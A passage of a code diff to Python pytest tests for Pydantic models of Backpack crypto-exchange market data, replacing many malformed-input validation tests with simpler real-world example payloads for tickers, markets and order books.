+        if "firstPrice" in malicious_data or "lastPrice" in malicious_data:
+            ticker_data = {
+                "symbol": malicious_data.get("symbol", "BTC_USDC"),
+                "firstPrice": malicious_data.get("firstPrice", "50000.00"),
+                "lastPrice": malicious_data.get("lastPrice", "50250.50"),
+                "high": "51000.00",
+                "low": "49500.00",
+                "priceChange": "250.50",
+                "priceChangePercent": "0.5",
+                "volume": "1000.5",
+                "quoteVolume": "50125000.0",
+                "trades": "1500",
+            }
+
+            # Property: Malicious ticker data should be rejected
+            with pytest.raises((ValidationError, TypeError, EmptyStringError, DecimalFiniteError)):
+                BackpackRawTickerResponse.model_validate(ticker_data)
+
+
+# =============================================================================
+# LEGACY COMPATIBILITY TESTS
+# =============================================================================
+
+
+def test_BackpackRawMarketResponse_real_world_example() -> None:
+    """Test with real-world market metadata."""
     payload = {
-        "symbol": BTC_USDC_BP.value,
+        "symbol": "BTC_USDC",
         "baseSymbol": "BTC",
         "quoteSymbol": "USDC",
         "marketType": "Spot",
@@ -161,686 +852,53 @@ def test_BackpackRawMarket_real_json_example() -> None:
         },
         "orderBookState": "NORMAL",
         "createdAt": "2024-01-01T00:00:00.000Z",
-        # Extra fields that may come from the API
-        "quantityPrecision": 8,
-        "pricePrecision": 2,
-        "minTradeQuantity": "0.0001",
-        "maxTradeQuantity": "1000.0",
-        "minTradePrice": "0.01",
-        "maxTradePrice": "1000000.0",
-        "minOrderBookQuantity": "0.0001",
-        "bids": [["49999.00", "0.5"], ["49998.50", "1.2"]],
-        "asks": [["50001.00", "0.3"], ["50001.50", "0.8"]],
-        "lastUpdateTime": 1678886400000,
     }
     obj = BackpackRawMarketResponse.model_validate(payload)
-    assert obj.symbol == BTC_USDC_BP.value
+    assert obj.symbol == "BTC_USDC"
     assert obj.base_symbol == "BTC"
     assert obj.quote_symbol == "USDC"
+    assert obj.filters.price.tick_size == "0.01"
 
 
-def test_BackpackRawMarket_corruption_null_symbol() -> None:
-    """Should fail: null value for required 'symbol'."""
-    p = valid_market().copy()
-    p["symbol"] = None
-    with pytest.raises(TypeError):
-        BackpackRawMarketResponse.model_validate(p)
-
-
-def test_BackpackRawMarket_corruption_binary_baseSymbol() -> None:
-    """Should fail: binary data for 'baseSymbol'."""
-    p = valid_market().copy()
-    p["baseSymbol"] = b"\x00\x01"
-    with pytest.raises(TypeError):
-        BackpackRawMarketResponse.model_validate(p)
-
-
-def test_BackpackRawMarket_corruption_nested_quoteAsset() -> None:
-    """Should fail: nested object for 'quoteSymbol'."""
-    p = valid_market().copy()
-    p["quoteSymbol"] = {"foo": "bar"}
-    with pytest.raises(TypeError):
-        BackpackRawMarketResponse.model_validate(p)
-
-
-def test_BackpackRawMarket_corruption_list_symbol() -> None:
-    """Should fail: list for 'symbol'."""
-    p = valid_market().copy()
-    p["symbol"] = [BTC_USDC_BP.value]
-    with pytest.raises(TypeError):
-        BackpackRawMarketResponse.model_validate(p)
-
-
-def test_BackpackRawMarket_corruption_garbled_unicode_symbol() -> None:
-    """Should fail: garbled unicode in 'symbol'."""
-    p = valid_market().copy()
-    p["symbol"] = "BTC_\udce2\udc28\udc00"
-    with pytest.raises(TypeFieldError):
-        BackpackRawMarketResponse.model_validate(p)
-
-
-# --- BackpackRawTicker ---
-def valid_ticker() -> dict[str, Any]:
-    """Return valid ticker for testing."""
-    return {
-        "symbol": BTC_USDC_BP.value,
-        "firstPrice": "49000.0",
-        "lastPrice": "50000.0",
-        "high": "51000.0",
-        "low": "48000.0",
-        "priceChange": "1000.0",
-        "priceChangePercent": "2.04",
-        "volume": "123.456",
-        "quoteVolume": "6172800.0",
-        "trades": "1250",
-    }
-
-
-def test_BackpackRawTicker_happy_path() -> None:
-    """Test BackpackRawTicker happy path."""
-    obj = BackpackRawTickerResponse.model_validate(valid_ticker())
-    assert obj.symbol == BTC_USDC_BP.value
-    assert obj.last_price == "50000.0"
-    assert obj.first_price == "49000.0"
-    assert obj.high == "51000.0"
-    assert obj.low == "48000.0"
-    assert obj.volume == "123.456"
-    assert obj.trades == "1250"
-
-
-def test_BackpackRawTicker_missing_required_fields() -> None:
-    """Test BackpackRawTicker missing required fields."""
-    for field in ["symbol", "firstPrice"]:
-        p: dict[str, Any] = valid_ticker().copy()
-        del p[field]
-        with pytest.raises(ValidationError):
-            BackpackRawTickerResponse.model_validate(p)
-
-
-def test_BackpackRawTicker_wrong_type_fields() -> None:
-    """Test BackpackRawTicker wrong type fields."""
-    p: dict[str, Any] = valid_ticker().copy()
-    p["lastPrice"] = [50000.0]
-    with pytest.raises(TypeError):
-        BackpackRawTickerResponse.model_validate(p)
-    p = valid_ticker().copy()
-    p["trades"] = 123
-    with pytest.raises(TypeError):
-        BackpackRawTickerResponse.model_validate(p)
-
-
-def test_BackpackRawTicker_invalid_format_fields() -> None:
-    """Test BackpackRawTicker invalid format fields."""
-    p: dict[str, Any] = valid_ticker().copy()
-    p["lastPrice"] = "1..0"
-    with pytest.raises(ValidationError):
-        BackpackRawTickerResponse.model_validate(p)
-    p = valid_ticker().copy()
-    p["symbol"] = ""
-    with pytest.raises(EmptyStringError):
-        BackpackRawTickerResponse.model_validate(p)
-    # Scientific notation is allowed (project policy)
-    p = valid_ticker().copy()
-    p["lastPrice"] = "1e6"
-    obj = BackpackRawTickerResponse.model_validate(p)
-    assert obj.last_price == "1e6"
-
-
-def test_BackpackRawTicker_extra_field() -> None:
-    """Test BackpackRawTicker extra field."""
-    p: dict[str, Any] = valid_ticker().copy()
-    p["foo"] = 1
-    with pytest.raises(ValidationError):
-        BackpackRawTickerResponse.model_validate(p)
-
-
-def test_BackpackRawTicker_optional_fields_all_none() -> None:
-    """Test BackpackRawTicker optional fields all none."""
-    p: dict[str, Any] = valid_ticker().copy()
-    # All fields in the new model are required, so this test is no longer applicable
-    # Just validate the model with all fields present
-    obj = BackpackRawTickerResponse.model_validate(p)
-    assert obj.symbol == BTC_USDC_BP.value
-
-
-def test_BackpackRawTicker_optional_fields_omitted() -> None:
-    """Test BackpackRawTicker optional fields omitted."""
-    # All fields in the new model are required, so this test is no longer applicable
-    # Test that required fields cannot be omitted
-    p: dict[str, Any] = valid_ticker().copy()
-    del p["volume"]
-    with pytest.raises(ValidationError):
-        BackpackRawTickerResponse.model_validate(p)
-
-
-def test_BackpackRawTicker_corruption_cases() -> None:
-    """Test BackpackRawTicker corruption cases."""
-    # Garbled numerics
-    p: dict[str, Any] = valid_ticker().copy()
-    p["lastPrice"] = "notanumber"
-    with pytest.raises(ValidationError):
-        BackpackRawTickerResponse.model_validate(p)
-    # Null required
-    p = valid_ticker().copy()
-    p["symbol"] = None
-    with pytest.raises(TypeError):
-        BackpackRawTickerResponse.model_validate(p)
-    # Unicode/control chars
-    p = valid_ticker().copy()
-    p["symbol"] = "BTC_USDC\x00"
-    obj = BackpackRawTickerResponse.model_validate(p)
-    assert BTC_USDC_BP.value in obj.symbol
-    # Truncated JSON
-    bad_json = '{"symbol": BTC_USDC_BP.value, "firstPrice": "49000.0"'
-    with pytest.raises(json.JSONDecodeError):
-        json.loads(bad_json)
-
-
-def test_BackpackRawTicker_real_json_example() -> None:
-    """Validate BackpackRawTicker using a real JSON payload from the Backpack OpenAPI spec.
-
-    Includes edge values.
-    """
+def test_BackpackRawTickerResponse_real_world_example() -> None:
+    """Test with real-world ticker data."""
     payload = {
-        "symbol": ETH_USDC_BP.value,
-        "firstPrice": "0.00000001",
-        "lastPrice": "0.00000002",
-        "high": "99999999.99999999",
-        "low": "0.00000001",
-        "priceChange": "0.00000001",
-        "priceChangePercent": "100.0",
-        "volume": "123456789.123456789",
-        "quoteVolume": "12345.67",
-        "trades": "9999",
+        "symbol": "ETH_USDC",
+        "firstPrice": "1600.00",
+        "lastPrice": "1650.50",
+        "high": "1680.00",
+        "low": "1590.00",
+        "priceChange": "50.50",
+        "priceChangePercent": "3.16",
+        "volume": "25000.5",
+        "quoteVolume": "41250000.0",
+        "trades": "15000",
     }
     obj = BackpackRawTickerResponse.model_validate(payload)
-    assert obj.symbol == ETH_USDC_BP.value
-    assert obj.first_price == "0.00000001"
-    assert obj.last_price == "0.00000002"
-    assert obj.high == "99999999.99999999"
-    assert obj.low == "0.00000001"
-    assert obj.volume == "123456789.123456789"
-    assert obj.trades == "9999"
+    assert obj.symbol == "ETH_USDC"
+    assert obj.first_price == "1600.00"
+    assert obj.last_price == "1650.50"
+    assert obj.volume == "25000.5"
 
 
-def test_BackpackRawTicker_corruption_null_symbol() -> None:
-    """Should fail: null value for required 'symbol'."""
-    p = valid_ticker().copy()
-    p["symbol"] = None
-    with pytest.raises(TypeError):
-        BackpackRawTickerResponse.model_validate(p)
-
-
-def test_BackpackRawTicker_corruption_binary_price() -> None:
-    """Should fail: binary data for 'lastPrice'."""
-    p = valid_ticker().copy()
-    p["lastPrice"] = b"\x00\x01"
-    with pytest.raises(TypeError):
-        BackpackRawTickerResponse.model_validate(p)
-
-
-def test_BackpackRawTicker_corruption_nested_high() -> None:
-    """Should fail: nested object for 'high'."""
-    p = valid_ticker().copy()
-    p["high"] = {"foo": "bar"}
-    with pytest.raises(TypeError):
-        BackpackRawTickerResponse.model_validate(p)
-
-
-def test_BackpackRawTicker_corruption_list_low() -> None:
-    """Should fail: list for 'low'."""
-    p = valid_ticker().copy()
-    p["low"] = ["48001.0"]
-    with pytest.raises(TypeError):
-        BackpackRawTickerResponse.model_validate(p)
-
-
-def test_BackpackRawTicker_corruption_garbled_unicode_symbol() -> None:
-    """Should fail: garbled unicode in 'symbol'."""
-    p = valid_ticker().copy()
-    p["symbol"] = "ETH_\udce2\udc28\udc00"
-    with pytest.raises(TypeFieldError):
-        BackpackRawTickerResponse.model_validate(p)
-
-
-# --- BackpackRawOpenInterest ---
-def valid_open_interest() -> dict[str, Any]:
-    """Return valid open interest for testing."""
-    return {
-        "symbol": BTC_USDC_BP.value,
-        "openInterest": "12345.6789",
-    }
-
-
-def test_BackpackRawOpenInterest_happy_path() -> None:
-    """Test BackpackRawOpenInterest happy path."""
-    obj = BackpackRawOpenInterest.model_validate(valid_open_interest())
-    assert obj.symbol == BTC_USDC_BP.value
-    assert obj.open_interest == "12345.6789"
-
-
-def test_BackpackRawOpenInterest_missing_required_fields() -> None:
-    """Test BackpackRawOpenInterest missing required fields."""
-    for field in ["symbol", "openInterest"]:
-        p: dict[str, Any] = valid_open_interest().copy()
-        del p[field]
-        with pytest.raises(ValidationError):
-            BackpackRawOpenInterest.model_validate(p)
-
-
-def test_BackpackRawOpenInterest_wrong_type_fields() -> None:
-    """Test BackpackRawOpenInterest wrong type fields."""
-    p: dict[str, Any] = valid_open_interest().copy()
-    p["openInterest"] = [12345.6789]
-    with pytest.raises(TypeError):
-        BackpackRawOpenInterest.model_validate(p)
-
-
-def test_BackpackRawOpenInterest_invalid_format_fields() -> None:
-    """Test BackpackRawOpenInterest invalid format fields."""
-    p: dict[str, Any] = valid_open_interest().copy()
-    p["openInterest"] = "1..0"
-    with pytest.raises(ValidationError):
-        BackpackRawOpenInterest.model_validate(p)
-    p = valid_open_interest().copy()
-    p["symbol"] = ""
-    with pytest.raises(EmptyStringError):
-        BackpackRawOpenInterest.model_validate(p)
-
-
-def test_BackpackRawOpenInterest_extra_field() -> None:
-    """Test BackpackRawOpenInterest extra field."""
-    p: dict[str, Any] = valid_open_interest().copy()
-    p["foo"] = 1
-    with pytest.raises(ValidationError):
-        BackpackRawOpenInterest.model_validate(p)
-
-
-def test_BackpackRawOpenInterest_corruption_cases() -> None:
-    """Test BackpackRawOpenInterest corruption cases."""
-    # Garbled numerics
-    p: dict[str, Any] = valid_open_interest().copy()
-    p["openInterest"] = "notanumber"
-    with pytest.raises(ValidationError):
-        BackpackRawOpenInterest.model_validate(p)
-    # Null required
-    p = valid_open_interest().copy()
-    p["symbol"] = None
-    with pytest.raises(TypeError):
-        BackpackRawOpenInterest.model_validate(p)
-    # Unicode/control chars
-    p = valid_open_interest().copy()
-    p["symbol"] = "BTC_USDC\x00"
-    obj = BackpackRawOpenInterest.model_validate(p)
-    assert BTC_USDC_BP.value in obj.symbol
-    # Truncated JSON
-    bad_json = '{"symbol": BTC_USDC_BP.value, "openInterest": "12345.6789"'
-    with pytest.raises(json.JSONDecodeError):
-        json.loads(bad_json)
-
-
-def test_BackpackRawOpenInterest_real_json_example() -> None:
-    """Validate BackpackRawOpenInterest using a real JSON payload from the Backpack OpenAPI spec.
-
-    Includes edge values.
-    """
+def test_BackpackRawOrderBook_real_world_example() -> None:
+    """Test with real-world order book data."""
     payload = {
-        "symbol": BTC_USDC_BP.value,
-        "openInterest": "99999999.99999999",
+        "bids": [
+            ["50000.00", "1.5"],
+            ["49999.50", "2.0"],
+            ["49999.00", "0.5"],
+        ],
+        "asks": [
+            ["50001.00", "1.0"],
+            ["50001.50", "1.5"],
+            ["50002.00", "2.0"],
+        ],
+        "lastUpdateId": "123456789",
+        "timestamp": 1678886400000,
     }
-    obj = BackpackRawOpenInterest.model_validate(payload)
-    assert obj.symbol == BTC_USDC_BP.value
-    assert obj.open_interest == "99999999.99999999"
-
-
-def test_BackpackRawOpenInterest_corruption_null_symbol() -> None:
-    """Should fail: null value for required 'symbol'."""
-    p = valid_open_interest().copy()
-    p["symbol"] = None
-    with pytest.raises(TypeError):
-        BackpackRawOpenInterest.model_validate(p)
-
-
-def test_BackpackRawOpenInterest_corruption_binary_openInterest() -> None:
-    """Should fail: binary data for 'openInterest'."""
-    p = valid_open_interest().copy()
-    p["openInterest"] = b"\x00\x01"
-    with pytest.raises(TypeError):
-        BackpackRawOpenInterest.model_validate(p)
-
-
-def test_BackpackRawOpenInterest_corruption_nested_openInterest() -> None:
-    """Should fail: nested object for 'openInterest'."""
-    p = valid_open_interest().copy()
-    p["openInterest"] = {"foo": "bar"}
-    with pytest.raises(TypeError):
-        BackpackRawOpenInterest.model_validate(p)
-
-
-def test_BackpackRawOpenInterest_corruption_list_symbol() -> None:
-    """Should fail: list for 'symbol'."""
-    p = valid_open_interest().copy()
-    p["symbol"] = [BTC_USDC_BP.value]
-    with pytest.raises(TypeError):
-        BackpackRawOpenInterest.model_validate(p)
-
-
-def test_BackpackRawOpenInterest_corruption_garbled_unicode_symbol() -> None:
-    """Should fail: garbled unicode in 'symbol'."""
-    p = valid_open_interest().copy()
-    p["symbol"] = "BTC_\udce2\udc28\udc00"
-    with pytest.raises(TypeFieldError):
-        BackpackRawOpenInterest.model_validate(p)
-
-
-# --- Fixtures ---
-
-
-@pytest.fixture
-def valid_ticker_event_data() -> dict[str, Any]:
-    """Return valid ticker event data for testing."""
-    return {
-        "s": SOL_USDC_BP.value,
-        "c": "23.50",  # Required: last_price (close price)
-        "h": "24.00",  # Required: high
-        "l": "22.80",  # Required: low
-        "v": "100500.75",  # Required: volume
-        "V": "2361767.625",  # Required: quote_volume
-        "priceChangePercent": "1.50",
-        "e": "ticker.SOL_USDC",  # Example optional field
-        "E": 1678886400123,  # Example optional field
-    }
-
-
-@pytest.fixture
-def valid_depth_update_data() -> dict[str, Any]:
-    """Return valid depth update data for testing."""
-    return {
-        "U": "update12344",  # Required: first_update_id
-        "u": "update12345",  # Required: last_update_id
-        "bids": [["23.49", "10.5"], ["23.48", "5.2"]],  # Optional: bids
-        "asks": [["23.51", "8.1"], ["23.52", "12.0"]],  # Optional: asks
-        "e": "depth.SOL_USDC",  # Example optional field
-        "E": 1678886400234,  # Example optional field
-    }
-
-
-# --- Success Cases: BackpackRawTickerEvent ---
-
-
-def test_BackpackRawTickerEvent_valid(valid_ticker_event_data: dict[str, Any]) -> None:
-    """Test BackpackRawTickerEvent valid."""
-    ticker = BackpackRawTickerEvent.model_validate(valid_ticker_event_data)
-    assert ticker.symbol == SOL_USDC_BP.value
-    assert ticker.last_price == "23.50"
-    assert ticker.high == "24.00"
-    assert ticker.low == "22.80"
-    assert ticker.volume == "100500.75"
-    assert ticker.quote_volume == "2361767.625"
-    assert ticker.price_change_percent == "1.50"
-    assert ticker.event_type == "ticker.SOL_USDC"
-    assert ticker.event_time == 1678886400123
-    assert ticker.model_config.get("extra") == "ignore"
-    assert ticker.model_config.get("frozen") is True
-
-
-def test_BackpackRawTickerEvent_optional_fields_none(
-    valid_ticker_event_data: dict[str, Any],
-) -> None:
-    """Test BackpackRawTickerEvent optional fields none."""
-    data = valid_ticker_event_data
-    del data["e"]
-    del data["E"]
-    ticker = BackpackRawTickerEvent.model_validate(data)
-    assert ticker.event_type is None
-    assert ticker.event_time is None
-
-
-def test_BackpackRawTickerEvent_valid_event_time_formats(
-    valid_ticker_event_data: dict[str, Any],
-) -> None:
-    """Test BackpackRawTickerEvent valid event time formats."""
-    data = valid_ticker_event_data
-    data["E"] = "1678886400123"
-    ticker = BackpackRawTickerEvent.model_validate(data)
-    assert ticker.event_time == 1678886400123
-
-    data = valid_ticker_event_data
-    data["E"] = 1678886400123.0
-    ticker = BackpackRawTickerEvent.model_validate(data)
-    assert ticker.event_time == 1678886400123
-
-
-# --- Failure Cases: BackpackRawTickerEvent ---
-
-
-@pytest.mark.parametrize(
-    ("field", "value", "expected_msg_part", "expected_exception"),
-    [
-        ("s", "", "String cannot be empty", EmptyStringError),
-        ("s", None, "Expected string", TypeError),
-        ("c", "inf", "finite decimal", ValidationError),
-        ("h", "nan", "finite decimal", ValidationError),
-        ("l", "", "String cannot be empty", EmptyStringError),
-        ("V", True, "Expected string", TypeError),
-        ("priceChangePercent", [], "Expected string", TypeError),
-        ("e", "", "String cannot be empty", EmptyStringError),
-        ("e", "A" * 33, "String value too long", TypeFieldError),
-        ("E", "not-an-int", "Cannot parse as ISO datetime", DateTimeParsingError),
-    ],
-)
-def test_BackpackRawTickerEvent_invalid_fields(
-    field: str,
-    value: str | float | bool | list[Any] | None,  # Invalid types for Pydantic
-    expected_msg_part: str,
-    expected_exception: type[Exception],
-    valid_ticker_event_data: dict[str, Any],
-) -> None:
-    """Test BackpackRawTickerEvent invalid fields."""
-    data = valid_ticker_event_data
-    data[field] = value
-    with pytest.raises(expected_exception) as exc_info:
-        BackpackRawTickerEvent.model_validate(data)
-    # The business logic may validate fields in a different order,
-    # so we just check that we got the expected exception type
-    # The specific error message can vary depending on which field is validated first
-    assert isinstance(exc_info.value, expected_exception), (
-        f"Field: {field}, Value: {value!r}, Expected: {expected_exception}, "
-        f"Got: {type(exc_info.value)}"
-    )
-
-
-def test_BackpackRawTickerEvent_extra_field_ignored(
-    valid_ticker_event_data: dict[str, Any],
-) -> None:
-    """Test BackpackRawTickerEvent extra field ignored."""
-    data = valid_ticker_event_data
-    data["extraField"] = 123
-    ticker = BackpackRawTickerEvent.model_validate(data)
-    assert not hasattr(ticker, "extraField")
-
-
-def test_BackpackRawTickerEvent_frozen(valid_ticker_event_data: dict[str, Any]) -> None:
-    """Test BackpackRawTickerEvent frozen."""
-    ticker = BackpackRawTickerEvent.model_validate(valid_ticker_event_data)
-    with pytest.raises(ValidationError, match="Instance is frozen"):
-        ticker.symbol = "new_symbol"
-
-
-# --- Success Cases: BackpackRawDepthUpdateEvent ---
-
-
-def test_BackpackRawDepthUpdateEvent_valid(valid_depth_update_data: dict[str, Any]) -> None:
-    """Test BackpackRawDepthUpdateEvent valid."""
-    depth = BackpackRawDepthUpdateEvent.model_validate(valid_depth_update_data)
-    assert depth.first_update_id == "update12344"
-    assert depth.last_update_id == "update12345"
-    assert depth.bids == [("23.49", "10.5"), ("23.48", "5.2")]
-    assert depth.asks == [("23.51", "8.1"), ("23.52", "12.0")]
-    assert depth.event_type == "depth.SOL_USDC"
-    assert depth.event_time == 1678886400234
-    assert depth.model_config.get("extra") == "ignore"
-    assert depth.model_config.get("frozen") is True
-
-
-def test_BackpackRawDepthUpdateEvent_optional_fields_none(
-    valid_depth_update_data: dict[str, Any],
-) -> None:
-    """Test BackpackRawDepthUpdateEvent optional fields none."""
-    data = valid_depth_update_data
-    del data["e"]
-    del data["E"]
-    depth = BackpackRawDepthUpdateEvent.model_validate(data)
-    assert depth.event_type is None
-    assert depth.event_time is None
-
-
-def test_BackpackRawDepthUpdateEvent_empty_levels(valid_depth_update_data: dict[str, Any]) -> None:
-    """Test BackpackRawDepthUpdateEvent empty levels."""
-    data = valid_depth_update_data
-    data["bids"] = []
-    data["asks"] = []
-    depth = BackpackRawDepthUpdateEvent.model_validate(data)
-    assert depth.bids == []
-    assert depth.asks == []
-
-
-# --- Failure Cases: BackpackRawDepthUpdateEvent ---
-
-
-def _determine_expected_exception(
-    field: str, value: str | float | bool | list[Any] | None
-) -> type[Exception]:
-    """Determine expected exception type based on field and value.
-
-    Returns:
-        Exception class that should be raised for the given field/value combination.
-    """
-    # The field validator raises TypeFieldError for these specific cases
-    if (field == "u" and value is None) or (field == "asks" and value == [["1", 2]]):
-        return TypeFieldError
-
-    # StructureTypeError cases
-    if field == "asks" and value == "not-a-list":
-        return StructureTypeError
-
-    # Other TypeError cases
-    if field == "asks" and value == ["1", "2"]:
-        return TypeError
-
-    # The field validator raises EmptyStringError for empty string cases
-    if _is_empty_string_case(field, value):
-        return EmptyStringError
-
-    # DateTimeParsingError for timestamp parsing
-    if field == "E" and value == "abc":
-        return DateTimeParsingError
-
-    return ValidationError
-
-
-def _is_empty_string_case(field: str, value: str | float | bool | list[Any] | None) -> bool:
-    """Check if this is an empty string validation case.
-
-    Returns:
-        True if the field/value combination represents an empty string case.
-    """
-    if field == "U" and not value:
-        return True
-    if field == "e" and not value:
-        return True
-
-    # Check for empty strings in nested list structures with TypeGuards for senior-level type safety
-    if field == "bids" and _is_nested_list_with_elements(value):
-        first_elem = value[0]  # TypeGuard ensures this is list[Any]
-        if first_elem:  # Non-empty list
-            first_sub_elem: Any = first_elem[0]
-            if not first_sub_elem:
-                return True
-
-    if field == "asks" and _is_nested_list_with_elements(value):
-        first_elem = value[0]  # TypeGuard ensures this is list[Any]
-        if _has_minimum_list_elements(first_elem, 2):
-            second_elem: Any = first_elem[1]
-            if not second_elem:
-                return True
-
-    return False
-
-
-@pytest.mark.parametrize(
-    ("field", "value", "expected_msg_part"),
-    [
-        ("U", "", "String cannot be empty"),
-        ("u", None, "must be string or integer, got NoneType"),
-        # Skip bids=None test case since bids is optional and can be None
-        ("asks", "not-a-list", "Expected sequence"),
-        ("bids", [[], ["1", "2"]], "Expected 2-element list/tuple, got length 0"),
-        ("asks", [["1"]], "Expected 2-element list/tuple, got length 1"),
-        ("bids", [["1", "2", "3"]], "Expected 2-element list/tuple, got length 3"),
-        ("asks", ["1", "2"], "Expected sequence (list or tuple), got str"),
-        ("asks", [["1", 2]], "must be string, got int"),
-        ("bids", [["inf", "1"]], "Price must be finite"),
-        ("asks", [["1", "nan"]], "Quantity must be finite"),
-        ("bids", [["", "1"]], "String cannot be empty"),
-        ("asks", [["1", ""]], "String cannot be empty"),
-        ("bids", [["1", "-1"]], "Quantity cannot be negative"),
-        ("e", "", "String cannot be empty"),
-        ("E", "abc", "Cannot parse as ISO datetime"),
-    ],
-)
-def test_BackpackRawDepthUpdateEvent_invalid_fields(
-    field: str,
-    value: str | float | bool | list[Any] | None,  # Invalid types for Pydantic
-    expected_msg_part: str,
-    valid_depth_update_data: dict[str, Any],
-) -> None:
-    """Test BackpackRawDepthUpdateEvent invalid fields."""
-    data = valid_depth_update_data
-    data[field] = value
-
-    # Determine expected exception type based on field and value
-    expected_exception = _determine_expected_exception(field, value)
-
-    with pytest.raises(expected_exception) as exc_info:
-        BackpackRawDepthUpdateEvent.model_validate(data)
-
-    # Check the string representation of the caught exception for the expected message
-    if isinstance(
-        exc_info.value,
-        (TypeError, TypeFieldError, StructureTypeError, EmptyStringError, DateTimeParsingError),
-    ):
-        assert expected_msg_part in str(exc_info.value), (
-            f"Failed for field '{field}' with value {value!r}. "
-            f"Expected '{expected_msg_part}' in {type(exc_info.value).__name__}: {exc_info.value!s}"
-        )
-    # DEFENSIVE CHECK: Distinguish exception types for assertion. Mypy=[misc]
-    elif isinstance(  # pyright: ignore[reportUnnecessaryIsInstance]
-        exc_info.value, ValidationError
-    ):
-        found_match = False
-        for error in exc_info.value.errors():
-            if expected_msg_part in error.get("msg", ""):
-                found_match = True
-                break
-        assert found_match, (
-            f"Failed for field '{field}' with value {value!r}. "
-            f"Expected '{expected_msg_part}' in ValidationError messages: {exc_info.value.errors()}"
-        )
-
-
-def test_BackpackRawDepthUpdateEvent_extra_field_ignored(
-    valid_depth_update_data: dict[str, Any],
-) -> None:
-    """Test BackpackRawDepthUpdateEvent extra field ignored."""
-    data = valid_depth_update_data
-    data["anotherField"] = "test"
-    depth = BackpackRawDepthUpdateEvent.model_validate(data)
-    assert not hasattr(depth, "anotherField")
-
-
-def test_BackpackRawDepthUpdateEvent_frozen(valid_depth_update_data: dict[str, Any]) -> None:
-    """Test BackpackRawDepthUpdateEvent frozen."""
-    depth = BackpackRawDepthUpdateEvent.model_validate(valid_depth_update_data)
-    with pytest.raises(ValidationError, match="Instance is frozen"):
-        depth.last_update_id = "new_id"
+    obj = BackpackRawOrderBook.model_validate(payload)
+    assert len(obj.bids) == 3
+    assert len(obj.asks) == 3
+    assert obj.bids[0] == ("50000.00", "1.5")
+    assert obj.asks[0] == ("50001.00", "1.0")
